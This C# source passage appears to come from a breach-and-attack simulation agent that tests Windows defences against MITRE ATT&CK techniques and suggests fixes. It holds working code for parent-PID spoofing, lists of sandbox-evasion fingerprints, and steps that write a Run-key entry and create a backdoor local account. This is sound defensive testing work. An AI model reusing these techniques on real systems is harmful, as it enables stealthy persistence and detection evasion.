        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    const int  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

    static async Task<SimulationCategory> Sim_2_10_PPIDSpoofingValidation()
    {
        var cat = new SimulationCategory
        {
            Name  = "2.10 Parent PID Spoofing",
            Phase = "Defense Evasion"
        };

        // â”€â”€ Check 1: Spoofing Explorer.exe â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "PPID Spoofing â€” Spawning payload under explorer.exe",
            "T1134.004",
            async () =>
            {
                await Task.CompletedTask;
                // Find explorer.exe
                var explorer = Process.GetProcessesByName("explorer").FirstOrDefault();
                if (explorer == null)
                    return (CheckResult.Fail, "Could not find explorer.exe to spoof. Validation failed.", "Ensure desktop session is active.");

                bool success = TrySpawnSpoofedProcess(explorer.Handle, "cmd.exe /c exit");

                if (success)
                    return (CheckResult.Fail,
                        $"Successfully spawned a process with a forged parent header pointing to Explorer.exe (PID: {explorer.Id}). Process Tree telemetry logs (Sysmon EID 1) will incorrectly show the payload originating from the desktop shell.",
                        "Relying solely on process-parent heuristics is insufficient. Implement detection rules for cross-process handle access (Sysmon Event ID 10) targeting explorer.exe.");
                
                return (CheckResult.Pass,
                        "Failed to spawn spoofed process under Explorer. PPID spoof evasion blocked or restricted.",
                        "Excellent runtime protection blocking arbitrary handle manipulation.");
            }
        ) with { Severity = "High", ThreatImpact = "PPID Spoofing disconnects malware (like Cobalt Strike) from the true calling process (e.g., an Office macro), evading classic EDR rules looking for 'Word.exe -> PowerShell.exe'." });

        // â”€â”€ Check 2: Spoofing System svchost.exe (Privilege Test) 
        cat.Checks.Add(await RunCheck(
            "PPID Spoofing â€” Crossing privilege boundaries (svchost.exe)",
            "T1134.004",
            async () =>
            {
                await Task.CompletedTask;
                // Find a SYSTEM svchost (normally requires SeDebugPrivilege to get PROCESS_CREATE_PROCESS right)
                var svchost = Process.GetProcessesByName("svchost").FirstOrDefault();
                if (svchost == null)
                    return (CheckResult.Fail, "Could not find svchost.exe to spoof. Validation failed.", "Ensure system has svchost.");

                bool success = false;
                try
                {
                    success = TrySpawnSpoofedProcess(svchost.Handle, "cmd.exe /c exit");
                }
                catch (System.ComponentModel.Win32Exception) 
                { 
                    // Expected to fail with Access Denied if running as standard user without SeDebug
                    success = false; 
                }

                if (success)
                    return (CheckResult.Fail,
                        $"Successfully spoofed svchost.exe (PID: {svchost.Id}) as our parent. This endpoint allows standard or admin processes to forge execution trees originating from protected SYSTEM components.",
                        "Restrict SeDebugPrivilege to essential system accounts only. Enable 'LSA Protection' to harden core system processes against unauthorized handle requests.");

                return (CheckResult.Pass,
                        "Denied attempt to spoof a core system svchost process. Privilege boundaries are intact.",
                        "Maintain strict privilege separation and LSA Protection.");
            }
        ) with { Severity = "Medium", ThreatImpact = "Advanced malware attempts to blend into standard system noise by spawning payloads under svchost.exe. OS privilege boundaries should prevent user-mode apps from obtaining the required handles." });

        return cat;
    }

    static bool TrySpawnSpoofedProcess(IntPtr parentHandle, string commandLine)
    {
        var si = new STARTUPINFOEX();
        si.StartupInfo.cb = System.Runtime.InteropServices.Marshal.SizeOf(typeof(STARTUPINFOEX));

        IntPtr lpSize = IntPtr.Zero;
        // Call once to get size
        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
        if (lpSize == IntPtr.Zero) return false;

        si.lpAttributeList = System.Runtime.InteropServices.Marshal.AllocHGlobal(lpSize);
        if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref lpSize))
        {
            System.Runtime.InteropServices.Marshal.FreeHGlobal(si.lpAttributeList);
            return false;
        }

        // We must allocate unmanaged memory for the HANDLE value itself
        IntPtr pParentHandle = System.Runtime.InteropServices.Marshal.AllocHGlobal(IntPtr.Size);
        System.Runtime.InteropServices.Marshal.WriteIntPtr(pParentHandle, parentHandle);

        bool updateOk = UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            pParentHandle,
            (IntPtr)IntPtr.Size,
            IntPtr.Zero,
            IntPtr.Zero);

        if (!updateOk)
        {
            DeleteProcThreadAttributeList(si.lpAttributeList);
            System.Runtime.InteropServices.Marshal.FreeHGlobal(si.lpAttributeList);
            System.Runtime.InteropServices.Marshal.FreeHGlobal(pParentHandle);
            return false;
        }

        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        bool created = CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref si, out pi);

        DeleteProcThreadAttributeList(si.lpAttributeList);
        System.Runtime.InteropServices.Marshal.FreeHGlobal(si.lpAttributeList);
        System.Runtime.InteropServices.Marshal.FreeHGlobal(pParentHandle);

        if (created)
        {
            // Clean up handles using CloseHandle implementation we already have
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return true;
        }
        return false;
    }

    // ============================================================
    // 2.11  SANDBOX & VIRTUALIZATION DETECTION (EVASION)
    // Tests if the host environment is fingerprinted by malware to 
    // evade automated analysis. Malware checks hardware limits, MAC 
    // OUIs, and security/analysis tools to remain stealthy.
    // ============================================================
    static async Task<SimulationCategory> Sim_2_11_SandboxDetection()
    {
        var cat = new SimulationCategory
        {
            Name = "2.11 Sandbox & Virtualization Detection",
            Phase = "Defense Evasion"
        };

        // â”€â”€ Check 1: Hardware Sandbox Profiling â”€â”€
        cat.Checks.Add(await RunCheck("Hardware Profiling â€” Memory and CPU Limitations", "T1497.001", async () =>
        {
            await Task.CompletedTask;
            // Many basic sandboxes run on <4GB RAM and 1 CPU core to save density.
            long physicalMemoryBytes = 0;
            try 
            {
                // Simple WMI call for memory size
                using var searcher = new System.Management.ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem");
                foreach (var obj in searcher.Get())
                {
                    physicalMemoryBytes = Convert.ToInt64(obj["TotalVisibleMemorySize"]) * 1024; // KB to Bytes
                }
            } 
            catch { }

            int currentCores = Environment.ProcessorCount;
            long ramGB = physicalMemoryBytes / (1024 * 1024 * 1024);

            bool looksLikeSandbox = currentCores < 2 || ramGB < 4;

            if (looksLikeSandbox)
            {
                return (CheckResult.Fail,
                    $"The environment has {currentCores} CPU cores and {ramGB} GB RAM. Malware checking for <2 cores or <4GB RAM would correctly identify this as a sandbox/analysis VM and refuse to detonate (evading analysis).",
                    "Configure automated malware analysis labs (sandboxes) with realistic hardware allocations (minimum 4 Cores, 8GB RAM) to trick evasive malware into detonating.");
            }
            return (CheckResult.Pass,
                $"The environment ({currentCores} Cores, {ramGB} GB RAM) exceeds typical lean sandbox parameters. Hardware evasion checks would trigger payload execution.",
                "Maintain realistic hardware allocations to prevent malware from hiding.");
        }) with { Severity = "Medium", ThreatImpact = "If a sandbox is lean, malware sleeps or exits cleanly. The security operations team gets a false 'benign' report, and the file is allowed into the enterprise network." });

        // â”€â”€ Check 2: MAC Address OUI Fingerprinting â”€â”€
        cat.Checks.Add(await RunCheck("Hypervisor Fingerprinting â€” MAC OUI Check", "T1497.001", async () =>
        {
            await Task.CompletedTask;
            
            // Known Hypervisor MAC OUIs
            string[] suspiciousOUIs = { 
                "00:05:69", "00:0C:29", "00:50:56", // VMware
                "08:00:27",                         // VirtualBox
                "00:1C:42",                         // Parallels
                "00:15:5D"                          // Hyper-V
            };

            var adapters = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
            var detectedOUIs = new List<string>();

            foreach (var adapter in adapters)
            {
                var mac = adapter.GetPhysicalAddress().ToString();
                if (mac.Length != 12) continue;
                
                // Format MAC to XX:XX:XX
                string oui = $"{mac.Substring(0,2)}:{mac.Substring(2,2)}:{mac.Substring(4,2)}";
                
                if (suspiciousOUIs.Contains(oui))
                {
                    detectedOUIs.Add($"{adapter.Name} ({oui})");
                }
            }

            if (detectedOUIs.Count > 0)
            {
                return (CheckResult.Fail,
                    $"Virtualization MAC OUIs detected: {string.Join(", ", detectedOUIs)}. Malware checks physical adapters to confirm it is inside a Hypervisor. An evasive payload would abort execution here.",
                    "Ensure automated malware analysis sandboxes use spoofed or realistic MAC addresses (e.g., matching Intel/Realtek hardware) rather than default Hypervisor pools.");
            }
            return (CheckResult.Pass,
                "No default hypervisor MAC ranges detected.",
                "Sandbox MAC obfuscation is working or the system runs on bare metal.");
        }) with { Severity = "High", ThreatImpact = "Automated sandboxes often leave the network interfaces as default Hyper-V or VMware adapters. Advanced payloads detect these instantly and cease malicious activity." });

        // â”€â”€ Check 3: Analysis Tooling Audit â”€â”€
        cat.Checks.Add(await RunCheck("Security Tooling Audit â€” Scanning for Analysis Software", "T1497.001", async () =>
        {
            await Task.CompletedTask;
            
            string[] analysisTools = { "wireshark", "procmon", "procmon64", "x32dbg", "x64dbg", "fiddler", "ollydbg", "processhacker", "tcpview", "autoruns" };
            var activeTools = new List<string>();

            var runningProcesses = Process.GetProcesses();
            foreach (var p in runningProcesses)
            {
                try
                {
                    if (analysisTools.Contains(p.ProcessName.ToLower()))
                    {
                        activeTools.Add(p.ProcessName);
                    }
                }
                catch { }
            }

            if (activeTools.Count > 0)
            {
                return (CheckResult.Fail,
                    $"Malware analysis/monitoring tools are currently active: {string.Join(", ", activeTools)}. An evasive payload scanning the process list would detect analysis and terminate.",
                    "When performing dynamic malware analysis, rename analysis binaries or run tools out-of-band (e.g., hypervisor-level introspection) so the payload cannot read them in the process list.");
            }
            return (CheckResult.Pass,
                "No standard malware analysis or reverse-engineering tool names were found running in user-space.",
                "Ensure any deployed agentless sandbox hides its analysis tools perfectly from the guest process tree.");
        }) with { Severity = "Medium", ThreatImpact = "Scanning the process list for 'wireshark.exe' or 'procmon.exe' is a trivial way for malware to realize a human researcher is watching. It will drop a fake dummy payload instead of the real ransomware." });


        return cat;
    }

    // ============================================================
    // 3.1  REGISTRY-BASED PERSISTENCE
    // ============================================================
    static async Task<SimulationCategory> Sim_3_1_RegistryPersistence()
    {
        var cat = new SimulationCategory { Name = "3.1 Registry-based Persistence", Phase = "Persistence" };

        // --- Run / RunOnce keys ---
        cat.Checks.Add(await RunCheck("Run / RunOnce key abuse", "T1547.001", async () =>
        {
            // Read current Run keys (do NOT write anything)
            var runKeys = ReadRegistryValueNames(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
            bool sysmonActive = IsSysmonRunning();
            bool edlRunning   = IsWindowsDefenderLogging();
            if (sysmonActive || edlRunning)
                return (CheckResult.Pass, $"Registry monitoring is active (Sysmon={sysmonActive}). Run-key changes would be logged. Current Run entries: {runKeys.Count}.", "Review Run keys regularly.");
            return (CheckResult.Fail, "No registry change monitoring detected. Persistence via Run keys may go unnoticed.", "Deploy Sysmon or enable registry-change auditing (Windows Audit).");
        }));

        // --- Scheduled task creation ---
        cat.Checks.Add(await RunCheck("Scheduled task creation", "T1053.005", async () =>
        {
            // List scheduled tasks via schtasks Ã¢â‚¬â€ benign read-only
            var (tasks, count) = ListScheduledTaskCount();
            bool taskLogging  = IsScheduledTaskLoggingEnabled();
            if (taskLogging)
                return (CheckResult.Pass, $"Scheduled task creation logging is enabled. Current task count: {count}.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, $"Task creation logging not confirmed. {count} tasks exist; new rogue tasks may not alert.", "Enable 'Microsoft-Windows-TaskScheduler' operational log.");
        }));

        // --- Startup folder abuse ---
        cat.Checks.Add(await RunCheck("Startup folder abuse", "T1547.001", async () =>
        {
            string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                              "Microsoft","Windows","Start Menu","Programs","StartUp");
            int fileCount = Directory.Exists(startupPath) ? Directory.GetFiles(startupPath).Length : 0;
            bool sysmonActive = IsSysmonRunning();
            if (sysmonActive)
                return (CheckResult.Pass, $"Sysmon monitors Startup folder. Current files: {fileCount}.", "Ã¢â‚¬â€");
            if (fileCount == 0)
                return (CheckResult.Pass, "Startup folder is empty and clean.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, $"Startup folder has {fileCount} items and no Sysmon monitoring detected.", "Enable file-creation auditing on Startup folders and deploy Sysmon.");
        }));

        return cat;
    }

    // ============================================================
    // 3.2  SERVICE & AUTORUN ABUSE
    // Tests: Service creation alerts, DLL hijack paths
    // ============================================================
    static async Task<SimulationCategory> Sim_3_2_ServiceAutorun()
    {
        var cat = new SimulationCategory { Name = "3.2 Service & Autorun Abuse", Phase = "Persistence" };

        // --- Fake service creation ---
        cat.Checks.Add(await RunCheck("Fake service creation", "T1543.003", async () =>
        {
            // Do NOT create a service.  Check if service-creation logging is on.
            bool sysmon  = IsSysmonRunning();
            bool svcLog  = IsServiceCreationLoggingEnabled();
            if (sysmon || svcLog)
                return (CheckResult.Pass, "Service creation logging is enabled Ã¢â‚¬â€ rogue service installations would alert.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "Service creation logging not detected.", "Enable Windows Security event 7045 and deploy Sysmon.");
        }));

        // --- DLL hijacking paths ---
        cat.Checks.Add(await RunCheck("DLL hijacking paths", "T1574.001", async () =>
        {
            // Check well-known hijackable paths for writable directories
            string[] paths = { @"C:\Windows\System32", @"C:\Windows\SysWOW64", @"C:\Windows" };
            var writable = new List<string>();
            foreach (var p in paths)
            {
                if (Directory.Exists(p) && HasWritePermission(p)) writable.Add(p);
            }
            if (writable.Count == 0)
                return (CheckResult.Pass, "System directories are not user-writable Ã¢â‚¬â€ DLL hijack surface is low.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, $"Writable system paths detected: {string.Join(", ", writable)}. DLL hijacking is possible.", "Restrict write permissions on system directories. Enable DLL search-order hardening.");
        }));

        // --- COM hijack simulation ---
        cat.Checks.Add(await RunCheck("COM hijack simulation", "T1574.011", async () =>
        {
            // Check HKCU\Software\Classes for per-user COM overrides (read-only)
            var comKeys = ReadRegistrySubKeyCount(@"Software\Classes");
            bool sysmon = IsSysmonRunning();
            if (sysmon)
                return (CheckResult.Pass, $"Sysmon active Ã¢â‚¬â€ COM registry changes would be logged. HKCU\\Classes subkeys: {comKeys}.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, $"COM hijack vectors exist (HKCU\\Classes has {comKeys} keys) and Sysmon is not monitoring.", "Deploy Sysmon and monitor HKCU\\Software\\Classes for unexpected changes.");
        }));

        return cat;
    }

    // ============================================================
    // 3.3  PERSISTENCE Ã¢â‚¬â€ BOOT, TASKS & ACCOUNT MANIPULATION
    // Tests if an attacker can survive a reboot via Run Keys,
    // Startup folder, Scheduled Tasks, and backdoor accounts.
    // ============================================================
    static async Task<SimulationCategory> Sim_3_3_PersistenceBootTasksAccounts()
    {
        var cat = new SimulationCategory
        {
            Name  = "3.3 Persistence Ã¢â‚¬â€ Boot, Tasks & Account Manipulation",
            Phase = "Persistence"
        };

        // Ã¢â€â‚¬Ã¢â€â‚¬ Check 1: Boot/Logon Autostart via Registry Run Keys & Startup Folder Ã¢â€â‚¬Ã¢â€â‚¬
        cat.Checks.Add(await RunCheck(
            "Boot/Logon Autostart Ã¢â‚¬â€ Registry Run Keys & Startup Folder",
            "T1547.001",
            async () =>
            {
                const string testValueName = "BAS_Persistence_Test";
                bool runKeyWriteSucceeded = false;

                // Step 1: Try to write a test Run Key safely using the Snapshot Rollback engine
                using (var snapshot = new RegistrySnapshot(Registry.CurrentUser, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", testValueName))
                {
                    try
                    {
                        using var key = Registry.CurrentUser.OpenSubKey(
                            @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                        if (key != null)
                        {
                            key.SetValue(testValueName, Environment.ProcessPath ?? "C:\\Windows\\System32\\cmd.exe");
                            // Wait 2s and check if AV removed it
                            await Task.Delay(2000);
                            runKeyWriteSucceeded = key.GetValue(testValueName) != null;
                        }
                    }
                    catch { runKeyWriteSucceeded = false; }
                }

                // Step 2: Try to drop a test payload in the Startup folder safely using the Snapshot Rollback engine
                bool startupDropSucceeded = false;
                string testStartupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "BAS_TestDrop.bat");
                using (var snapshot = new FileSnapshot(testStartupPath))
                {
                    try
                    {
                        File.WriteAllText(testStartupPath, "echo BAS Agent Simulation");
                        // Wait 2s and check if AV blocked/quarantined the file creation
                        await Task.Delay(2000);
                        startupDropSucceeded = File.Exists(testStartupPath);
                    }
                    catch { startupDropSucceeded = false; }
                }

                // Step 2b: Scan Startup folder for unexpected entries
                var startupPaths = new[]
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup))
                };
                var startupItems = new List<string>();
                foreach (var sp in startupPaths)
                {
                    if (!Directory.Exists(sp)) continue;
                    try
                    {
                        startupItems.AddRange(Directory.GetFiles(sp, "*",
                            SearchOption.AllDirectories)
                            .Select(Path.GetFileName)!
                            .Where(f => f != null)!);
                    }
                    catch { }
                }

                // Step 3: Count suspicious Run Key entries in HKLM (excluding known-good ones)
                var knownGoodRunKeys = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
                {
                    "SecurityHealth", "OneDrive", "Teams", "Cortana"
                };
                var suspiciousRunEntries = new List<string>();
                try
                {
                    using var hklmKey = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                    if (hklmKey != null)
                    {
                        foreach (var rvn in hklmKey.GetValueNames())
                        {
                            if (!knownGoodRunKeys.Contains(rvn))
                            {
                                var val = hklmKey.GetValue(rvn)?.ToString() ?? "";
                                // Flag entries pointing to writable user-space paths
                                if (val.Contains("\\AppData\\", StringComparison.OrdinalIgnoreCase) ||
                                    val.Contains("\\Temp\\",    StringComparison.OrdinalIgnoreCase) ||
                                    val.Contains("\\Users\\",   StringComparison.OrdinalIgnoreCase))
                                    suspiciousRunEntries.Add($"{rvn}={val}");
                            }
                        }
                    }
                }
                catch { }

                bool fail = runKeyWriteSucceeded || startupDropSucceeded || suspiciousRunEntries.Count > 0;
                var details = runKeyWriteSucceeded || startupDropSucceeded
                    ? $"Test persistence written and survived 2 seconds (RunKey: {runKeyWriteSucceeded}, Startup: {startupDropSucceeded}). Startup folder items: {startupItems.Count}."
                    : $"Test persistence write was blocked or removed within 2 seconds. Startup folder items: {startupItems.Count}." +
                      (suspiciousRunEntries.Count > 0 ? $" Suspicious HKLM Run entries: {string.Join("; ", suspiciousRunEntries.Take(3))}." : "");

                return (
                    fail ? CheckResult.Fail : CheckResult.Pass,
                    details,
                    fail
                        ? "Enable Microsoft Defender Tamper Protection. Deploy Attack Surface Reduction rule \"Block persistence through WMI event subscription\". Monitor HKCU/HKLM Run keys with a SIEM or FIM tool. Restrict write access to Startup folders via AppLocker."
                        : "Autostart monitoring is in place. Continue enforcing Startup folder write restrictions."
                );
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "Attackers write to Run Keys or Startup folders to persist across reboots. This is the most common APT persistence method Ã¢â‚¬â€ used by Emotet, Cobalt Strike, and dozens of ransomware families. A single entry guarantees re-infection after a reboot or AV remediation."
        });

        // Ã¢â€â‚¬Ã¢â€â‚¬ Check 2: Scheduled Task Persistence Bypass Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        cat.Checks.Add(await RunCheck(
            "Scheduled Task Persistence Ã¢â‚¬â€ Hourly Beacon Simulation",
            "T1053.005",
            async () =>
            {
                const string taskName = "BAS_Persistence_HourlyTest";
                bool taskCreated = false;
                string createOutput = "";

                // Attempt to create a benign scheduled task that runs cmd /c echo every hour
                try
                {
                    var psiCreate = new ProcessStartInfo("schtasks.exe",
                        $"/Create /F /SC HOURLY /TN \"{taskName}\" /TR \"cmd.exe /c echo BAS_Beacon\" /RL LIMITED")
                    {
                        RedirectStandardOutput = true,
                        RedirectStandardError  = true,
                        UseShellExecute        = false,
                        CreateNoWindow         = true
                    };
                    using var pCreate = Process.Start(psiCreate)!;
                    createOutput = await pCreate.StandardOutput.ReadToEndAsync();
                    var createErr = await pCreate.StandardError.ReadToEndAsync();
                    await WaitOrKillAsync(pCreate);
                    taskCreated = pCreate.ExitCode == 0;
                    createOutput += createErr;
                }
                catch { }

                // Always clean up Ã¢â‚¬â€ delete the test task regardless of detection
                try
                {
                    var psiDel = new ProcessStartInfo("schtasks.exe", $"/Delete /F /TN \"{taskName}\"")
                    {
                        UseShellExecute = false, CreateNoWindow = true,
                        RedirectStandardOutput = true, RedirectStandardError = true
                    };
                    using var pDel = Process.Start(psiDel)!;
                    await WaitOrKillAsync(pDel);
                }
                catch { }

                // Also check for any suspicious-looking existing tasks
                var suspiciousTasks = new List<string>();
                try
                {
                    var ps1Path = Path.Combine(Path.GetTempPath(), "bas_task_check.ps1");
                    const string psScript = @"
Get-ScheduledTask | Where-Object {
    $_.TaskPath -notlike '\Microsoft\*' -and
    $_.TaskPath -notlike '\Windows\*'
} | ForEach-Object {
    $a = ($_.Actions | Select-Object -First 1)
    $exe = if ($a.Execute) { $a.Execute } else { '' }
    if ($exe -match 'AppData|Temp|Users|Roaming|wscript|cscript|mshta') {
        Write-Output ($_.TaskName + '|' + $exe)
    }
}
";

                    await File.WriteAllTextAsync(ps1Path, psScript);
                    var psiPs = new ProcessStartInfo("powershell.exe",
                        $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{ps1Path}\"")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var pPs = Process.Start(psiPs)!;
                    while (!pPs.StandardOutput.EndOfStream)
                    {
                        var line = (await pPs.StandardOutput.ReadLineAsync())?.Trim();
                        if (!string.IsNullOrEmpty(line)) suspiciousTasks.Add(line);
                    }
                    await WaitOrKillAsync(pPs);
                    try { File.Delete(ps1Path); } catch { }
                }
                catch { }

                bool fail = taskCreated || suspiciousTasks.Count > 0;
                return (
                    fail ? CheckResult.Fail : CheckResult.Pass,
                    taskCreated
                        ? $"Benign test scheduled task was created successfully (no policy blocked it). This means an attacker can also create persistent tasks. Suspicious pre-existing tasks: {suspiciousTasks.Count}."
                        : $"Policy or access control blocked task creation. Suspicious pre-existing tasks found: {suspiciousTasks.Count}.",
                    fail
                        ? "Enable Scheduled Task auditing in Group Policy (Advanced Audit Policy Configuration Ã¢â€ â€™ Detailed Tracking Ã¢â€ â€™ Process Creation). Restrict \"schtasks.exe\" via AppLocker. Block the ASR rule: Use advanced protection against ransomware (c1db55ab-c21a-4637-bb3f-a12568109d35). Review existing tasks with unusual executable paths."
                        : "Task creation policy is adequately restricted. Continue monitoring via Windows Event ID 4698 (Scheduled Task Created)."
                );
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "Scheduled tasks are a primary persistence mechanism used by commodity malware and APTs. A task that runs every 60 minutes ensures the attacker's beacon is relaunched even after manual kill, reboot, or partial remediation."
        });

        // Ã¢â€â‚¬Ã¢â€â‚¬ Check 3: Account Manipulation Ã¢â‚¬â€ Backdoor User & Admin Audit Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        cat.Checks.Add(await RunCheck(
            "Account Manipulation Ã¢â‚¬â€ Backdoor User & Admin Group Audit",
            "T1136.001",
            async () =>
            {
                // Sub-check A: Is Guest account enabled?
                bool guestEnabled = false;
                try
                {
                    var psiGuest = new ProcessStartInfo("net.exe", "user Guest")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var pGuest = Process.Start(psiGuest)!;
                    var guestOut = await pGuest.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(pGuest);
                    guestEnabled = guestOut.Contains("Account active               Yes",
                        StringComparison.OrdinalIgnoreCase);
                }
                catch { }

                // Sub-check B: Enumerate local Administrators group members
                var adminAccounts = new List<string>();
                try
                {
                    var psiAdm = new ProcessStartInfo("net.exe", "localgroup Administrators")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var pAdm = Process.Start(psiAdm)!;
                    var admOut = await pAdm.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(pAdm);
                    bool inList = false;
                    foreach (var line in admOut.Split('\n'))
                    {
                        var l = line.Trim();
                        if (l.StartsWith("----")) { inList = true; continue; }
                        if (l.StartsWith("The command completed")) break;
                        if (inList && !string.IsNullOrEmpty(l)) adminAccounts.Add(l);
                    }
                }
                catch { }

                // Sub-check C: Check password policy minimum length
                int minPwdLen = 0;
                try
                {
                    var psiPwd = new ProcessStartInfo("net.exe", "accounts")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var pPwd = Process.Start(psiPwd)!;
                    var pwdOut = await pPwd.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(pPwd);
                    foreach (var line in pwdOut.Split('\n'))
                    {
                        if (line.Contains("Minimum password length"))
                        {
                            var parts = line.Split(':');
                            if (parts.Length > 1 && int.TryParse(parts[1].Trim(), out int parsed))
                                minPwdLen = parsed;
                        }
                    }
                }
                catch { }

                // Sub-check D: Attempt to create a test backdoor account (if fails = Pass)
                bool userCreateBlocked = true;
                try
                {
                    var psiCreate = new ProcessStartInfo("net.exe",
                        "user BAS_BackdoorTest_Tmp P@ssw0rdBAS123! /add")
                    {
                        RedirectStandardOutput = true,
                        RedirectStandardError  = true,
                        UseShellExecute        = false,
                        CreateNoWindow         = true
                    };
                    using var pCreate = Process.Start(psiCreate)!;
                    await WaitOrKillAsync(pCreate);
                    userCreateBlocked = pCreate.ExitCode != 0;

                    // Always clean up test account if created
                    if (!userCreateBlocked)
                    {
                        var psiDel = new ProcessStartInfo("net.exe", "user BAS_BackdoorTest_Tmp /delete")
                        {
                            UseShellExecute = false, CreateNoWindow = true,
                            RedirectStandardOutput = true
                        };
                        using var pDel = Process.Start(psiDel)!;
                        await WaitOrKillAsync(pDel);
                    }
                }
                catch { userCreateBlocked = true; }   // Cannot even run net.exe = effectively blocked

                bool weakPolicy = minPwdLen < 8;
                bool fail = guestEnabled || !userCreateBlocked || weakPolicy || adminAccounts.Count > 3;

                var issues = new List<string>();
                if (guestEnabled)              issues.Add("Guest account is ENABLED");
                if (!userCreateBlocked)        issues.Add("Local user creation NOT blocked by policy");
                if (weakPolicy)                issues.Add($"Minimum password length is only {minPwdLen} characters (<8)");
                if (adminAccounts.Count > 3)   issues.Add($"{adminAccounts.Count} local Administrator accounts detected (expected Ã¢â€°Â¤3)");

                return (
                    fail ? CheckResult.Fail : CheckResult.Pass,
                    fail
                        ? $"Account weaknesses: {string.Join("; ", issues)}. Admin accounts: {string.Join(", ", adminAccounts.Take(5))}."
                        : $"Account posture is adequate. Admin accounts: {adminAccounts.Count}. Min password length: {minPwdLen}. Guest: disabled. Local user creation: policy-blocked.",
                    fail
                        ? "1) Disable Guest account: net user Guest /active:no. 2) Enforce minimum password length Ã¢â€°Â¥14 via Group Policy (Computer Config Ã¢â€ â€™ Security Settings Ã¢â€ â€™ Account Policies). 3) Enable account auditing (Event IDs 4720, 4732). 4) Restrict local user creation to administrators only via AppLocker or privileged access workstation policies. 5) Review and prune the local Administrators group."
                        : "Account policy is adequately hardened. Continue periodic review of admin group membership."
                );
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "Creating a hidden backdoor admin account or re-enabling Guest gives persistent, high-privilege access that survives full malware removal. This technique is used in post-exploitation by Cobalt Strike operators and nation-state actors as a failsafe persistence mechanism."
        });

        return cat;
    }

    // ============================================================
    // 4.  PRIVILEGE ESCALATION (safe simulations)
    // Tests: UAC policies, Credential Guard, token controls
    // ============================================================
    static async Task<SimulationCategory> Sim_4_PrivilegeEscalation()
    {
        var cat = new SimulationCategory { Name = "4. Privilege Escalation", Phase = "Privilege Escalation" };

        // --- Token impersonation attempts ---
        cat.Checks.Add(await RunCheck("Token impersonation attempts", "T1078", async () =>
        {
            // Check if we are already SYSTEM or just local admin
            using var id = System.Security.Principal.WindowsIdentity.GetCurrent();
            bool isSystem = id.Name == @"NT AUTHORITY\SYSTEM";
            bool credGuard = IsCredentialGuardEnabled();
            if (credGuard)
                return (CheckResult.Pass, $"Credential Guard is enabled. Token impersonation is restricted. Current identity: {id.Name}.", "Ã¢â‚¬â€");
            if (isSystem)
                return (CheckResult.Fail, "Agent is running as SYSTEM Ã¢â‚¬â€ token impersonation trivially possible.", "Avoid running software as SYSTEM; use least-privilege service accounts.");
            return (CheckResult.Fail, $"Credential Guard not confirmed. Running as {id.Name}.", "Enable Credential Guard via Group Policy.");
        }));

        // --- UAC bypass logic (non-exploit) ---
        cat.Checks.Add(await RunCheck("UAC bypass logic (non-exploit)", "T1548.002", async () =>
        {
            // Read UAC ConsentPromptBehaviorAdmin setting
            var uacLevel = ReadUACPolicy();
            if (uacLevel <= 1)  // 0=off, 1=auto-elevate trusted
                return (CheckResult.Fail, $"UAC policy level is {uacLevel} Ã¢â‚¬â€ auto-elevation or disabled. Bypass risk is high.", "Set UAC to level 2 (Always notify) via securitypolicy.msc.");
